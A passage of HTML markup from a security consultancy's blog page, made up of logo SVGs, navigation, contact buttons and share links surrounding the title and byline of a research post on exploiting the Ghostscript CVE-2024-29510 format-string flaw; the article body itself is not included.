    <path d="M20.7457 3.32851C20.3552 2.93798 19.722 2.93798 19.3315 3.32851L12.0371 10.6229L4.74275 3.32851C4.35223 2.93798 3.71906 2.93798 3.32854 3.32851C2.93801 3.71903 2.93801 4.3522 3.32854 4.74272L10.6229 12.0371L3.32856 19.3314C2.93803 19.722 2.93803 20.3551 3.32856 20.7457C3.71908 21.1362 4.35225 21.1362 4.74277 20.7457L12.0371 13.4513L19.3315 20.7457C19.722 21.1362 20.3552 21.1362 20.7457 20.7457C21.1362 20.3551 21.1362 19.722 20.7457 19.3315L13.4513 12.0371L20.7457 4.74272C21.1362 4.3522 21.1362 3.71903 20.7457 3.32851Z" fill="currentColor"/>
</svg>
            <span>Close</span>
        </button>
        <iframe sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" class="basis-full"></iframe>
    </dialog>
  

        
    
<!-- We want to show a back-to-top button as soon as we have scrolled a certain amount. Let's place an element in the
viewport bottom and as soon as that is scrolled out of view we show the back to top button -->
<div class="absolute bottom-0" x-intersect:leave="show = true" x-intersect:enter="show = false" x-data="{'show': false, 'left': false }" x-init="Crisp?.session.onLoaded(() => left = true);">
    <button x-cloak x-show="show" class="hover:bg-transparent icon:transition-transform icon:hover:fill-content-neutral icon:duration-500 icon:hover:translate-y-[-10%] duration-500 grid items-center justify-center icon:fill-content-neutral/40 w-12 h-12 rounded-full fixed bottom-6  bg-content-neutral/5 transition-all z-[100]" x-bind:class="left ? 'left-6' : 'right-6'" x-on:click="window.scrollTo({top: 0, behavior: 'smooth'});">
        <svg width="25" height="25" viewBox="0 0 25 25" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M11.9375 21.8737V5.71791L7.05867 10.5814L6.01447 9.53719L12.6875 2.86414L19.3606 9.53719L18.3164 10.6064L13.4375 5.72751V21.8737H11.9375Z" />
</svg>
    </button>
</div>

<header class="header">
    <div class="header__container container">
        <div class="header__main">
            <a href="/" class="header__logo logo" aria-label="Logo Codean">
                <?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:serif="http://www.serif.com/" width="100%" height="100%" viewBox="0 0 400 115" version="1.1" fill="#020c16" xml:space="preserve" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;">
    <g id="shield">
        <path d="M0,8.405c0,-4.401 3.568,-7.831 7.969,-7.831l73.56,-0c4.401,-0 7.969,3.43 7.969,7.831l-0,36.918l-13.425,-6.713l0,-24.612l-62.648,0l-0,31.325l-13.425,-6.713l0,-30.205Z"></path>
        <path d="M76.073,58.747l0,24.612l-31.324,17.9l-31.324,-17.9l-0,-17.899l-13.425,-6.713l0,31.325l40.274,23.493c2.445,1.333 6.541,1.398 8.95,-0l40.274,-23.493l-0,-24.612l-13.425,-6.713Z"></path>
    </g>
    <g id="labs">
        <path d="M235.805,114.59c-4.316,-0 -7.649,-0.983 -9.999,-2.948c-2.313,-1.966 -3.507,-4.528 -3.584,-7.688l5.722,-0c0.116,1.85 0.79,3.333 2.023,4.451c1.272,1.079 3.199,1.618 5.78,1.618c2.274,0 3.892,-0.404 4.856,-1.214c0.963,-0.847 1.445,-1.888 1.445,-3.121c-0,-1.156 -0.347,-2.042 -1.041,-2.659c-0.693,-0.617 -1.444,-1.021 -2.254,-1.213c-0.771,-0.232 -2.254,-0.579 -4.451,-1.041c-2.273,-0.54 -4.161,-1.098 -5.664,-1.676c-1.503,-0.579 -2.775,-1.446 -3.815,-2.601c-1.041,-1.157 -1.561,-2.679 -1.561,-4.567c0,-2.581 0.983,-4.643 2.948,-6.185c2.004,-1.541 4.759,-2.312 8.266,-2.312c3.853,0 6.821,0.886 8.901,2.659c2.081,1.773 3.237,4.027 3.468,6.763l-5.722,0c-0.27,-1.426 -0.886,-2.582 -1.85,-3.468c-0.924,-0.925 -2.485,-1.388 -4.681,-1.388c-1.85,0 -3.218,0.328 -4.105,0.983c-0.886,0.655 -1.329,1.561 -1.329,2.717c-0,0.847 0.25,1.522 0.752,2.023c0.5,0.501 1.136,0.886 1.907,1.156c0.77,0.231 1.908,0.501 3.41,0.809c0.309,0.039 0.771,0.135 1.387,0.289c2.351,0.54 4.297,1.118 5.838,1.734c1.542,0.617 2.833,1.542 3.873,2.775c1.079,1.233 1.619,2.871 1.619,4.913c-0,2.89 -1.06,5.144 -3.179,6.763c-2.12,1.618 -5.106,2.428 -8.96,2.428" style="fill:#1a80e5;"></path>
        <path d="M205.152,109.908c2.659,-0 4.682,-1.041 6.069,-3.121c1.426,-2.082 2.139,-4.663 2.139,-7.746c-0,-3.083 -0.713,-5.665 -2.139,-7.745c-1.387,-2.082 -3.41,-3.122 -6.069,-3.122c-2.543,-0 -4.547,0.983 -6.011,2.948c-1.465,1.927 -2.197,4.566 -2.197,7.919c0,3.352 0.732,6.011 2.197,7.977c1.464,1.926 3.468,2.89 6.011,2.89m0.925,-26.474c2.505,0 4.759,0.636 6.763,1.908c2.004,1.271 3.583,3.082 4.74,5.433c1.156,2.351 1.734,5.106 1.734,8.266c-0,3.16 -0.578,5.915 -1.734,8.266c-1.157,2.35 -2.736,4.161 -4.74,5.433c-2.004,1.233 -4.258,1.85 -6.763,1.85c-2.158,-0 -3.988,-0.405 -5.491,-1.214c-1.503,-0.848 -2.698,-1.927 -3.584,-3.237l-0.115,-0l-0,3.641l-5.665,0l-0,-41.328l5.665,-0l-0,15.317l0.115,0c2.235,-2.89 5.26,-4.335 9.075,-4.335" style="fill:#1a80e5;"></path>
        <path d="M169.936,110.023c2.659,0 4.798,-0.655 6.416,-1.965c1.619,-1.349 2.427,-3.276 2.427,-5.78l0,-4.22c-0.423,0.386 -1.175,0.752 -2.254,1.098c-1.04,0.309 -2.446,0.655 -4.219,1.041c-2.659,0.54 -4.567,1.233 -5.722,2.081c-1.118,0.809 -1.677,1.965 -1.677,3.468c0,2.851 1.677,4.277 5.029,4.277m-1.271,4.567c-2.929,-0 -5.28,-0.771 -7.052,-2.313c-1.734,-1.541 -2.601,-3.583 -2.601,-6.126c-0,-2.12 0.481,-3.815 1.444,-5.087c1.002,-1.31 2.37,-2.312 4.104,-3.006c1.773,-0.732 4.027,-1.348 6.763,-1.85c1.889,-0.346 3.314,-0.655 4.278,-0.924c0.963,-0.308 1.734,-0.713 2.311,-1.214c0.579,-0.54 0.867,-1.272 0.867,-2.197c0,-2.62 -1.868,-3.93 -5.606,-3.93c-2.505,-0 -4.258,0.424 -5.26,1.271c-1.002,0.848 -1.58,2.274 -1.734,4.278l-5.78,-0c0.154,-3.044 1.29,-5.492 3.41,-7.341c2.119,-1.85 5.318,-2.774 9.595,-2.774c3.314,-0 5.954,0.809 7.919,2.427c2.004,1.58 3.006,4.162 3.006,7.746l-0,13.525c-0,1.118 0.096,1.946 0.289,2.486c0.193,0.501 0.558,0.751 1.098,0.751l0.694,-0.057l-0,3.468c-1.002,0.231 -1.966,0.346 -2.89,0.346c-1.465,0 -2.583,-0.327 -3.353,-0.982c-0.732,-0.694 -1.176,-1.85 -1.329,-3.468l-0.116,-0c-0.963,1.58 -2.293,2.813 -3.988,3.699c-1.696,0.848 -3.719,1.272 -6.069,1.272" style="fill:#1a80e5;"></path>
        <path d="M157.055,113.78l-20.058,0c-3.99,0 -7.225,-3.234 -7.225,-7.225l0,-34.103l6.358,-0l0,35.837l20.925,0l-0,5.491Z" style="fill:#1a80e5;"></path>
    </g>
    <g id="codean">
        <path d="M385.736,17.69c4.195,0 7.608,1.231 10.237,3.692c2.685,2.405 4.027,5.957 4.027,10.656l0,29.702l-8.223,0l0,-27.437c0,-3.02 -0.727,-5.37 -2.181,-7.048c-1.399,-1.678 -3.58,-2.517 -6.545,-2.517c-3.524,0 -6.348,0.979 -8.474,2.937c-2.07,1.958 -3.104,4.559 -3.104,7.803l-0,26.262l-8.223,0l-0,-42.791l8.223,-0l-0,5.37l0.167,-0c1.287,-1.902 3.105,-3.468 5.454,-4.699c2.349,-1.286 5.23,-1.93 8.642,-1.93"></path>
        <path d="M335.142,56.286c3.86,0 6.964,-0.951 9.313,-2.853c2.35,-1.957 3.524,-4.754 3.524,-8.39l0,-6.125c-0.615,0.559 -1.706,1.091 -3.272,1.594c-1.51,0.448 -3.552,0.951 -6.125,1.511c-3.86,0.783 -6.628,1.789 -8.307,3.02c-1.622,1.175 -2.433,2.853 -2.433,5.034c0,4.14 2.433,6.209 7.3,6.209m-1.846,6.629c-4.251,-0 -7.663,-1.119 -10.236,-3.356c-2.517,-2.238 -3.776,-5.203 -3.776,-8.894c0,-3.077 0.699,-5.538 2.098,-7.384c1.454,-1.902 3.44,-3.356 5.957,-4.363c2.573,-1.063 5.845,-1.958 9.817,-2.685c2.741,-0.503 4.81,-0.951 6.209,-1.342c1.398,-0.448 2.517,-1.035 3.356,-1.762c0.839,-0.783 1.258,-1.846 1.258,-3.189c0,-3.803 -2.713,-5.705 -8.138,-5.705c-3.636,-0 -6.181,0.615 -7.636,1.846c-1.454,1.23 -2.293,3.3 -2.517,6.209l-8.39,-0c0.223,-4.419 1.874,-7.971 4.95,-10.656c3.077,-2.685 7.719,-4.028 13.928,-4.028c4.811,0 8.642,1.175 11.495,3.524c2.909,2.294 4.363,6.041 4.363,11.244l0,19.633c0,1.622 0.14,2.825 0.42,3.608c0.279,0.727 0.811,1.091 1.594,1.091l1.007,-0.084l-0,5.034c-1.455,0.336 -2.853,0.504 -4.196,0.504c-2.125,-0 -3.747,-0.476 -4.866,-1.427c-1.063,-1.007 -1.706,-2.685 -1.93,-5.034l-0.168,-0c-1.398,2.293 -3.328,4.083 -5.789,5.37c-2.461,1.23 -5.398,1.846 -8.81,1.846"></path>
        <path d="M307.37,36.065c-0,-3.412 -1.119,-6.209 -3.357,-8.39c-2.181,-2.238 -5.062,-3.356 -8.642,-3.356c-3.468,-0 -6.348,1.09 -8.642,3.272c-2.293,2.126 -3.552,4.95 -3.776,8.474l24.417,0Zm8.558,3.356c-0,1.623 -0.028,2.657 -0.084,3.105l-32.891,-0c0.112,3.86 1.259,7.132 3.441,9.817c2.237,2.629 5.369,3.943 9.397,3.943c3.356,0 5.929,-0.811 7.719,-2.433c1.846,-1.622 3.021,-3.384 3.524,-5.286l8.39,0c-1.23,4.363 -3.496,7.859 -6.796,10.488c-3.3,2.629 -7.635,3.944 -13.005,3.944c-4.419,-0 -8.223,-0.979 -11.411,-2.937c-3.188,-1.958 -5.622,-4.643 -7.3,-8.055c-1.622,-3.412 -2.433,-7.328 -2.433,-11.746c0,-4.475 0.839,-8.419 2.517,-11.831c1.734,-3.412 4.195,-6.069 7.384,-7.971c3.188,-1.902 6.936,-2.853 11.243,-2.853c6.433,0 11.411,1.958 14.935,5.874c3.58,3.915 5.37,9.229 5.37,15.941"></path>
        <path d="M249.224,56.118c3.692,0 6.6,-1.398 8.726,-4.195c2.126,-2.853 3.188,-6.712 3.188,-11.579c0,-4.866 -1.062,-8.698 -3.188,-11.494c-2.126,-2.853 -5.034,-4.28 -8.726,-4.28c-3.86,0 -6.824,1.511 -8.894,4.531c-2.07,3.021 -3.104,6.769 -3.104,11.243c-0,4.475 1.034,8.223 3.104,11.244c2.07,3.02 5.034,4.53 8.894,4.53m11.998,-54.37l8.223,0l-0,59.992l-8.223,0l0,-5.034l-0.168,-0c-1.398,1.79 -3.188,3.272 -5.369,4.447c-2.126,1.174 -4.727,1.762 -7.804,1.762c-3.635,-0 -6.908,-0.895 -9.816,-2.685c-2.909,-1.846 -5.202,-4.475 -6.881,-7.887c-1.678,-3.412 -2.517,-7.412 -2.517,-11.999c0,-4.586 0.839,-8.586 2.517,-11.998c1.679,-3.412 3.972,-6.041 6.881,-7.887c2.908,-1.846 6.181,-2.769 9.816,-2.769c3.133,0 5.762,0.616 7.887,1.846c2.182,1.175 3.944,2.713 5.286,4.615l0.168,-0l0,-22.403Z"></path>
        <path d="M203.999,56.202c4.196,0 7.356,-1.454 9.482,-4.363c2.181,-2.964 3.272,-6.796 3.272,-11.495c-0,-4.698 -1.091,-8.502 -3.272,-11.411c-2.126,-2.964 -5.286,-4.447 -9.482,-4.447c-4.251,0 -7.467,1.455 -9.649,4.364c-2.181,2.908 -3.272,6.74 -3.272,11.494c0,4.699 1.091,8.531 3.272,11.495c2.182,2.909 5.398,4.363 9.649,4.363m-0.083,6.797c-4.363,-0 -8.167,-0.951 -11.411,-2.853c-3.245,-1.902 -5.734,-4.559 -7.468,-7.971c-1.678,-3.412 -2.517,-7.356 -2.517,-11.831c-0,-4.474 0.867,-8.418 2.601,-11.83c1.734,-3.412 4.195,-6.069 7.384,-7.971c3.244,-1.958 7.075,-2.937 11.494,-2.937c4.363,0 8.139,0.951 11.328,2.853c3.244,1.902 5.705,4.587 7.383,8.055c1.734,3.412 2.601,7.328 2.601,11.747c0,4.474 -0.867,8.446 -2.601,11.914c-1.734,3.412 -4.223,6.069 -7.467,7.971c-3.189,1.902 -6.964,2.853 -11.327,2.853"></path>
        <path d="M153.321,62.915c-5.593,-0 -10.516,-1.315 -14.767,-3.944c-4.195,-2.685 -7.467,-6.377 -9.817,-11.075c-2.293,-4.755 -3.44,-10.125 -3.44,-16.11c0,-5.985 1.147,-11.355 3.44,-16.109c2.35,-4.755 5.65,-8.447 9.901,-11.076c4.251,-2.685 9.173,-4.027 14.767,-4.027c4.867,-0 9.146,0.951 12.837,2.853c3.748,1.901 6.713,4.474 8.894,7.719c2.182,3.244 3.524,6.908 4.028,10.991l-9.649,0c-0.671,-3.748 -2.266,-6.936 -4.783,-9.565c-2.517,-2.685 -6.349,-4.027 -11.495,-4.027c-6.209,-0 -10.823,2.209 -13.844,6.628c-2.965,4.419 -4.447,9.929 -4.447,16.529c0,6.657 1.482,12.194 4.447,16.613c3.021,4.419 7.635,6.629 13.844,6.629c5.314,-0 9.258,-1.427 11.831,-4.279c2.629,-2.909 4.111,-6.489 4.447,-10.74l9.649,-0c-0.448,4.475 -1.762,8.446 -3.944,11.914c-2.181,3.468 -5.146,6.181 -8.894,8.139c-3.747,1.958 -8.082,2.937 -13.005,2.937"></path>
    </g>
</svg>
            </a>
            <div class="header__nav">
                <!-- TOOD: Switch to tailwind fixed top-20 right-0 bg-surface-chrome max-w-[640px] w-10/12 transition-all overflow-y-auto z-50 translate-x-full translate-y-full -->
<div class="nav">
    <div class="p-10 lg:p-0 space-y-10">
        <div class="flex flex-col gap-4">
            <ul id="menu-primary-menu" class="menu"><li id="menu-item-902" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-902"><a href="https://codeanlabs.com/services/">Services</a></li>
<li id="menu-item-997" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-997"><a href="https://codeanlabs.com/pricing/">Pricing</a></li>
<li id="menu-item-1413" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-1413"><a href="https://codeanlabs.com/blog/">Blog</a></li>
<li id="menu-item-903" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-903"><a href="https://codeanlabs.com/about/">About</a></li>
<li id="menu-item-1620" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1620"><a href="https://codeanlabs.com/jobs/">Jobs</a></li>
</ul>        </div>
        <div class="flex flex-col gap-4 lg:hidden">
        <a
href="https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true"
target="_self"

class="button button-primary button-base"
onclick="/*modal:href*/;return false;">Schedule a meeting</a>
<a
href="https://codeanlabs.com/pentest/"
target="_self"

class="button button-white button-base"
>Need a pentest?</a>
        </div>
        <div class="flex flex-col gap-4 lg:hidden">
            <span class="uppercase text-content-neutral/40">Get in touch</span>
            <a href="/cdn-cgi/l/email-protection#95fdf0f9f9fad5f6faf1f0f4fbf9f4f7e6bbf6faf8" class="text-content-neutral/70 hover:text-content-neutral">
                <span class="__cf_email__" data-cfemail="87efe2ebebe8c7e4e8e3e2e6e9ebe6e5f4a9e4e8ea">[email&#160;protected]</span>            </a>
            <a href="tel:+31 (0)30 899 3984" class="text-content-neutral/70 hover:text-content-neutral">
                +31 (0)30 899 3984            </a>
        </div>
    </div>
</div>
            </div>
        </div>
        <div class="header__buttons">
            <button @click="$store.theme.toggle()" @click.shift.prevent="$store.theme.reset()" class="w-12 h-12 button button-transparent icon:fill-content-neutral"  aria-label="Theme switch dark/light">
                <template x-if="$store.theme.isLight()"><svg width="25" height="25" viewBox="0 0 25 25" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M12.8268 21.1969C10.4657 21.1969 8.45879 20.3705 6.80602 18.7178C5.15324 17.065 4.32684 15.0581 4.32684 12.697C4.32684 10.4342 5.09447 8.49347 6.62972 6.87489C8.16495 5.2563 10.0447 4.3797 12.2691 4.24509C12.4127 4.24509 12.5537 4.25021 12.6921 4.26046C12.8306 4.27071 12.9665 4.28609 13.0998 4.30661C12.5896 4.78353 12.1832 5.3598 11.8806 6.03544C11.5781 6.71109 11.4268 7.4316 11.4268 8.19696C11.4268 9.83586 12.0004 11.2289 13.1476 12.3762C14.2949 13.5234 15.6879 14.097 17.3268 14.097C18.1025 14.097 18.8255 13.9457 19.496 13.6432C20.1665 13.3406 20.737 12.9342 21.2075 12.424C21.2281 12.5573 21.2434 12.6932 21.2537 12.8316C21.264 12.9701 21.2691 13.1111 21.2691 13.2547C21.1409 15.479 20.2675 17.3588 18.6489 18.8941C17.0303 20.4293 15.0896 21.1969 12.8268 21.1969ZM12.8268 19.697C14.2935 19.697 15.6102 19.2928 16.7768 18.4845C17.9435 17.6761 18.7935 16.622 19.3268 15.322C18.9935 15.4053 18.6602 15.472 18.3268 15.522C17.9935 15.572 17.6602 15.597 17.3268 15.597C15.2768 15.597 13.531 14.8761 12.0893 13.4345C10.6477 11.9928 9.92682 10.247 9.92682 8.19696C9.92682 7.86363 9.95182 7.5303 10.0018 7.19696C10.0518 6.86363 10.1185 6.5303 10.2018 6.19696C8.90182 6.7303 7.84765 7.58029 7.03932 8.74696C6.23099 9.91363 5.82682 11.2303 5.82682 12.697C5.82682 14.6303 6.51015 16.2803 7.87682 17.647C9.24348 19.0136 10.8935 19.697 12.8268 19.697Z" />
</svg>
</template>
                <template x-if="!$store.theme.isLight()"><svg width="25" height="25" viewBox="0 0 25 25" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M12.4747 15.697C13.3081 15.697 14.0164 15.4053 14.5997 14.822C15.1831 14.2386 15.4747 13.5303 15.4747 12.697C15.4747 11.8636 15.1831 11.1553 14.5997 10.572C14.0164 9.98863 13.3081 9.69697 12.4747 9.69697C11.6414 9.69697 10.9331 9.98863 10.3497 10.572C9.7664 11.1553 9.47473 11.8636 9.47473 12.697C9.47473 13.5303 9.7664 14.2386 10.3497 14.822C10.9331 15.4053 11.6414 15.697 12.4747 15.697ZM12.4747 17.1969C11.226 17.1969 10.1639 16.7591 9.28821 15.8835C8.41257 15.0078 7.97476 13.9457 7.97476 12.697C7.97476 11.4483 8.41257 10.3861 9.28821 9.51044C10.1639 8.63481 11.226 8.19699 12.4747 8.19699C13.7234 8.19699 14.7856 8.63481 15.6613 9.51044C16.5369 10.3861 16.9747 11.4483 16.9747 12.697C16.9747 13.9457 16.5369 15.0078 15.6613 15.8835C14.7856 16.7591 13.7234 17.1969 12.4747 17.1969ZM2.47473 13.4469C2.26223 13.4469 2.08411 13.375 1.94038 13.2312C1.79661 13.0874 1.72473 12.9092 1.72473 12.6966C1.72473 12.484 1.79661 12.306 1.94036 12.1624C2.08409 12.0188 2.26221 11.947 2.47471 11.947H4.72473C4.93721 11.947 5.11533 12.0189 5.25908 12.1627C5.40285 12.3065 5.47473 12.4847 5.47473 12.6973C5.47473 12.9099 5.40286 13.088 5.25911 13.2316C5.11536 13.3751 4.93724 13.4469 4.72476 13.4469H2.47473ZM20.2247 13.4469C20.0122 13.4469 19.8341 13.375 19.6904 13.2312C19.5466 13.0874 19.4747 12.9092 19.4747 12.6966C19.4747 12.484 19.5466 12.306 19.6904 12.1624C19.8341 12.0188 20.0122 11.947 20.2247 11.947H22.4747C22.6872 11.947 22.8654 12.0189 23.0091 12.1627C23.1528 12.3065 23.2247 12.4847 23.2247 12.6973C23.2247 12.9099 23.1528 13.088 23.0091 13.2316C22.8654 13.3751 22.6872 13.4469 22.4747 13.4469H20.2247ZM12.4744 5.69697C12.2618 5.69697 12.0837 5.62509 11.9401 5.48134C11.7965 5.33759 11.7248 5.15947 11.7248 4.94699V2.69697C11.7248 2.48447 11.7967 2.30634 11.9405 2.16259C12.0843 2.01886 12.2625 1.94699 12.4751 1.94699C12.6877 1.94699 12.8657 2.01886 13.0093 2.16259C13.1529 2.30634 13.2247 2.48447 13.2247 2.69697V4.94699C13.2247 5.15947 13.1528 5.33759 13.009 5.48134C12.8652 5.62509 12.687 5.69697 12.4744 5.69697ZM12.4744 23.447C12.2618 23.447 12.0837 23.3751 11.9401 23.2313C11.7965 23.0876 11.7248 22.9095 11.7248 22.697V20.4469C11.7248 20.2345 11.7967 20.0563 11.9405 19.9126C12.0843 19.7688 12.2625 19.697 12.4751 19.697C12.6877 19.697 12.8657 19.7688 13.0093 19.9126C13.1529 20.0563 13.2247 20.2345 13.2247 20.4469V22.697C13.2247 22.9095 13.1528 23.0876 13.009 23.2313C12.8652 23.3751 12.687 23.447 12.4744 23.447ZM6.48053 7.73732L5.22283 6.51424C5.07411 6.37577 5.00231 6.20174 5.00743 5.99214C5.01256 5.78253 5.08534 5.60016 5.22576 5.44504C5.37892 5.28991 5.55871 5.21234 5.76511 5.21234C5.97152 5.21234 6.14717 5.28991 6.29203 5.44504L7.52473 6.69314C7.6696 6.84827 7.74203 7.02392 7.74203 7.22007C7.74203 7.41622 7.6712 7.59185 7.52953 7.74697C7.38788 7.90208 7.21641 7.97547 7.01513 7.96714C6.81385 7.95881 6.63565 7.88218 6.48053 7.73732ZM18.6574 19.9488L17.4247 18.7008C17.2799 18.5457 17.2074 18.3675 17.2074 18.1662C17.2074 17.9649 17.2799 17.7918 17.4247 17.647C17.56 17.4919 17.729 17.4185 17.9319 17.4268C18.1348 17.4351 18.3138 17.5117 18.4689 17.6566L19.7266 18.8797C19.8753 19.0181 19.9471 19.1922 19.942 19.4018C19.9369 19.6114 19.8641 19.7937 19.7237 19.9489C19.5705 20.104 19.3908 20.1816 19.1844 20.1816C18.9779 20.1816 18.8023 20.104 18.6574 19.9488ZM17.4247 7.75177C17.2696 7.61012 17.1962 7.43865 17.2046 7.23737C17.2129 7.03608 17.2895 6.85788 17.4344 6.70277L18.6574 5.44507C18.7959 5.29635 18.9699 5.22455 19.1795 5.22967C19.3891 5.2348 19.5715 5.30758 19.7266 5.44799C19.8818 5.60116 19.9593 5.78094 19.9593 5.98734C19.9593 6.19376 19.8818 6.3694 19.7266 6.51427L18.4786 7.74697C18.3234 7.89183 18.1478 7.96427 17.9516 7.96427C17.7555 7.96427 17.5798 7.89343 17.4247 7.75177ZM5.22283 19.951C5.0677 19.7945 4.99013 19.613 4.99013 19.4066C4.99013 19.2002 5.0677 19.0245 5.22283 18.8797L6.47091 17.647C6.62604 17.5021 6.80424 17.4297 7.00551 17.4297C7.20679 17.4297 7.37986 17.5021 7.52473 17.647C7.67345 17.7822 7.74364 17.9513 7.73531 18.1542C7.72697 18.357 7.65357 18.5361 7.51511 18.6912L6.29203 19.9489C6.14717 20.104 5.97152 20.179 5.76511 20.1739C5.55871 20.1687 5.37795 20.0945 5.22283 19.951Z"/>
</svg>
</template>
            </button>
            <div class="items-center gap-2 hidden sm:flex">
            <a
href="https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true"
target="_self"

class="button button-primary button-base"
onclick="/*modal:href*/;return false;">Schedule a meeting</a>
<a
href="https://codeanlabs.com/pentest/"
target="_self"

class="button button-white button-base"
>Need a pentest?</a>
            </div>
            <button class="header__hamburger hamburger btn btn--secondary-outline" aria-label="Hamburger menu">
                <div class="hamburger__icon">
                    <span></span>
                    <span></span>
                </div>
            </button>
        </div>
    </div>
</header>

<!-- Section menu system -->
<nav x-data="{'showMenu': false}" class="overflow-hidden fixed top-[81px] text-lg lg:text-base text-content-neutral w-screen bg-surface-chrome/70 z-[4500] backdrop-blur-lg pb-[1px] transition-transform duration-500 -translate-y-full" x-bind:class="(showAnchors && anchor != '' ) && '!translate-y-0'">
    <div class="lg:hidden border-b-content-neutral/[0.15]" x-on:click="showMenu = !showMenu" x-bind:class="showMenu && 'border-b'">
        <div class="container py-4 flex justify-between items-center icon:h-4 icon:w-4 icon:fill-content-neutral/40" >
            <span class="text-ellipsis overflow-hidden font-medium" x-text="anchorTitle"></span>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M12 17.932L2 7.93195L3.86392 6.06804L12 14.2041L20.1361 6.06804L22 7.93195L12 17.932Z"/>
</svg>
        </div>
    </div>
    <ul class="container hidden h-screen lg:h-fit lg:flex text-content-neutral/70  flex-col lg:flex-row gap-0 lg:gap-12 font-medium relative" x-bind:class="showMenu && '!flex'" >
        </ul>
</nav>
<div x-intersect:leave.margin.100px="showAnchors = true" x-intersect:enter.margin.100px="showAnchors = false"></div>
<div class="flex flex-col gap-24 my-32 lg:mt-48"> <!-- Wrapping for ALL content so everything is always nicely spaced -->
<div class="hero-post block-spacing">
    <div class="hero-post__container container">
        <div class="hero-post__copy container container--s">
            <div class="hero-post__meta text text--s">
                <!-- <span><a href="https://codeanlabs.com/blog/">Blog</a></span> -->
                <span class="hero-post__category">
                    <a href="https://codeanlabs.com/blog/category/research/">Research</a>                </span>
                
                <span>Thomas Rinsma</span>

                <span class="hero-post__date">07-02-2024</span>
            </div>
            <h1 class="hero-post__title heading heading--xl">CVE-2024-29510 &#8211; Exploiting Ghostscript using format strings</h1>
        </div>
        <figure class="hero-post__image container container--s">
            <img width="954" height="506" src="https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png 954w, https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header-300x159.png 300w, https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header-768x407.png 768w" sizes="auto, (max-width: 954px) 100vw, 954px" />        </figure>
        
<div class="social-share">
    <div class="social-share__container">
        <span class="social-share__label text text--s">Share article</span>
        <div class="social-share__buttons">
            <a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F&title=CVE-2024-29510+%26%238211%3B+Exploiting+Ghostscript+using+format+strings" target="_blank" class="social-share__button">
                <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M20.447 20.452H16.893V14.883C16.893 13.555 16.866 11.846 15.041 11.846C13.188 11.846 12.905 13.291 12.905 14.785V20.452H9.351V9H12.765V10.561H12.811C13.288 9.661 14.448 8.711 16.181 8.711C19.782 8.711 20.448 11.081 20.448 14.166L20.447 20.452ZM5.337 7.433C4.193 7.433 3.274 6.507 3.274 5.368C3.274 4.23 4.194 3.305 5.337 3.305C6.477 3.305 7.401 4.23 7.401 5.368C7.401 6.507 6.476 7.433 5.337 7.433ZM7.119 20.452H3.555V9H7.119V20.452ZM22.225 0H1.771C0.792 0 0 0.774 0 1.729V22.271C0 23.227 0.792 24 1.771 24H22.222C23.2 24 24 23.227 24 22.271V1.729C24 0.774 23.2 0 22.222 0H22.225Z"/>
</g>
</svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F" target="_blank" class="social-share__button">
                
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M24 12.073C24 5.446 18.627 0.072998 12 0.072998C5.373 0.072998 0 5.446 0 12.073C0 18.063 4.388 23.027 10.125 23.927V15.542H7.078V12.072H10.125V9.43C10.125 6.423 11.917 4.761 14.658 4.761C15.97 4.761 17.344 4.996 17.344 4.996V7.949H15.83C14.339 7.949 13.874 8.874 13.874 9.823V12.073H17.202L16.67 15.543H13.874V23.928C19.612 23.027 24 18.062 24 12.073Z"/>
</g>
</svg>
            </a>
            <a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F&text=CVE-2024-29510+%26%238211%3B+Exploiting+Ghostscript+using+format+strings" target="_blank" class="social-share__button">
                <svg width="24" height="24" viewBox="0 0 24 24"  xmlns="http://www.w3.org/2000/svg">
<g >
